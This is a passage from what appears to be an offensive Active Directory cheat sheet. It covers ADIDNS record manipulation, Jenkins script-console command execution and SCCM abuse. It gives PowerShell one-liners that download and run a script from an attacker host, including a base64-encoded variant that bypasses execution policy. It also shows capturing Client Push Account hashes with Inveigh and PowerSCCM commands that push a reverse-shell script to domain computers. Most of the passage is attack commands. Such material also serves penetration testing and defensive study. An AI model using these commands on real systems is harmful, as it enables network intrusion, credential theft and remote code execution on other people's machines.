relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># remove a node</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Remove-ADIDNSNode</span> <span class="cm-operator">-</span><span class="cm-identifier">Node</span> <span class="cm-operator">*</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># check the wildcard record works/resolve a name</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Resolve-DnsName</span> <span class="cm-identifier">NameThatDoesntExist</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 379px;"></div><div class="CodeMirror-gutters" style="height: 429px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-dns-update-with-invo">DNS update with Invoke-DNSUpdate</h4>
<p id="bkmrk-to-work-with-%22classi">To work with "classic" record, i.e. not wildcard record</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 709px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 709.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-DNSUpdate</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSType</span> <span class="cm-identifier">A</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSName</span> <span class="cm-identifier">test</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">DNSData</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">attacker_IP</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Realm</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-feature-abuse">Feature Abuse</h3>
<h4 id="bkmrk-jenkins">Jenkins</h4>
<p id="bkmrk-go-to-http%3A%2F%2F%3Cip%3E%2Fsc">Go to <code>http://&lt;IP&gt;/script</code></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 412px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 412.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">def sout = new StringBuffer(), serr = new StringBuffer()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">def proc = '[INSERT COMMAND]'.execute()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">proc.consumeProcessOutput(sout, serr)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">proc.waitForOrKill(1000)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">println "out&gt; $sout err&gt; $serr"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-without-admin-access">Without admin access : add a build step in the build configuration, add <code>"Execute Windows Batch Command"</code> and <code>powershell c &lt;command&gt;</code></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1093px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 1092.71px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">powershell <span class="cm-attribute">-c</span> <span class="cm-string">"iex (new-object system.net.webclient).downloadstring('http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1')"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#For more hardened policy</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#On Kali</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">    <span class="cm-builtin">echo</span> <span class="cm-string">"iex (new-object system.net.webclient).downloadstring('http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1')"</span> | iconv <span class="cm-attribute">--to-code</span> UTF-16LE | base64 <span class="cm-attribute">-w</span> <span class="cm-number">0</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#In Jenkins</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">    cmd.exe /c PowerShell.exe <span class="cm-attribute">-Exec</span> ByPass <span class="cm-attribute">-Nol</span> <span class="cm-attribute">-Enc</span> &lt;base64_command&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 213px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-sccm">SCCM</h4>
<p id="bkmrk-client-push-accounts"><strong>Client Push Accounts</strong></p>
<p id="bkmrk-with-a-compromised-m">With a compromised machine in an Active Directory where SCCM is deployed via <strong>Client Push Accounts</strong> (the default configuration) on the assets, it is possible to retrieve the Net-NTLM hash of the Client Push Account, which generally has Adminsitrator privileges on lots of assets. Full explains <a href="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts">here</a>. To do it:</p>
<ul id="bkmrk-remove-all-the-local"><li>Remove all the local Administrators on the compromised machine : <code>net user &lt;username&gt; /delete</code>
</li>
<li>Listen with Inveigh : <code>Invoke-Inveigh -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y</code>
</li>
<li>Wait for the Client Push Accounts that will attempt to authenticate automatically</li>
<li>Hope for Net-NTLMv1, relay possibility or wathever</li>
</ul><p id="bkmrk-powersccm"><strong>PowerSCCM</strong></p>
<p id="bkmrk-with-sufficient-righ">With sufficient rights on the central SCCM server (rights on WMI), it is possible to deploy applications or scripts on the AD computers (SYSTEM on the server basically, to have rights on WMI) with <strong>PowerSCCM</strong>:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 955px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 466px; min-width: 955.19px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create SCCM Session with WMI</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-SccmSiteCode</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">SCCM_computer</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">New-SccmSession</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">SCCM_computer</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">SiteCode</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">site_code</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">ConnectionType</span> <span class="cm-identifier">WMI</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Retrieve computers linked to the SCCM server</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-SccmSession</span> <span class="cm-operator">|</span> <span class="cm-identifier">Get-SccmComputer</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create a computer collection</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-SccmSession</span> <span class="cm-operator">|</span> <span class="cm-identifier">New-SccmCollection</span> <span class="cm-operator">-</span><span class="cm-identifier">CollectionName</span> <span class="cm-string">"col"</span> <span class="cm-operator">-</span><span class="cm-identifier">CollectionType</span> <span class="cm-string">"Device"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Add computer to the collection</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-SccmSession</span> <span class="cm-operator">|</span> <span class="cm-identifier">Add-SccmDeviceToCollection</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerNameToAdd</span> <span class="cm-string">"&lt;computer&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">CollectionName</span> <span class="cm-string">"col"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create an app to deploy</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-SccmSession</span> <span class="cm-operator">|</span> <span class="cm-identifier">New-SccmApplication</span> <span class="cm-operator">-</span><span class="cm-identifier">ApplicationName</span> <span class="cm-string">"&lt;application_name&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">PowerShellB64</span> <span class="cm-string">"&lt;powershell_script_in_B64&gt;"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create an app deployment with the app and the collection previously created</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-SccmSession</span> <span class="cm-operator">|</span> <span class="cm-identifier">New-SccmApplicationDeployment</span> <span class="cm-operator">-</span><span class="cm-identifier">ApplicationName</span> <span class="cm-string">"&lt;application_name&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">AssignmentName</span> <span class="cm-string">"assig"</span> <span class="cm-operator">-</span><span class="cm-identifier">CollectionName</span> <span class="cm-string">"col"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Force the machine in the collection to check the app update (and force the install)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-SccmSession</span> <span class="cm-operator">|</span> <span class="cm-identifier">Invoke-SCCMDeviceCheckin</span> <span class="cm-operator">-</span><span class="cm-identifier">CollectionName</span> <span class="cm-string">"col"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 466px;"></div><div class="CodeMirror-gutters" style="height: 516px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-if-application-deplo">If application deployement doesn't work, it is worth to test CMScript deployement (deploy a script instead of an app). <strong>PowerSCCM</strong> also permits to do it with this <a href="https://github.com/PowerShellMafia/PowerSCCM/pull/6">PR</a> :</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1172px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1172.33px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">New-CMScriptDeployement</span> <span class="cm-operator">-</span><span class="cm-identifier">CMDrive</span> <span class="cm-string">'&lt;new_drive_name&gt;'</span> <span class="cm-operator">-</span><span class="cm-identifier">ServerFQDN</span> <span class="cm-string">'&lt;SCCM_server_FQDN&gt;'</span> <span class="cm-operator">-</span><span class="cm-identifier">TargetDevice</span> <span class="cm-string">'&lt;target_FQDN&gt;'</span> <span class="cm-operator">-</span><span class="cm-identifier">Path</span> <span class="cm-string">'.\reverse.ps1'</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptName</span> <span class="cm-string">'EvilScript'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
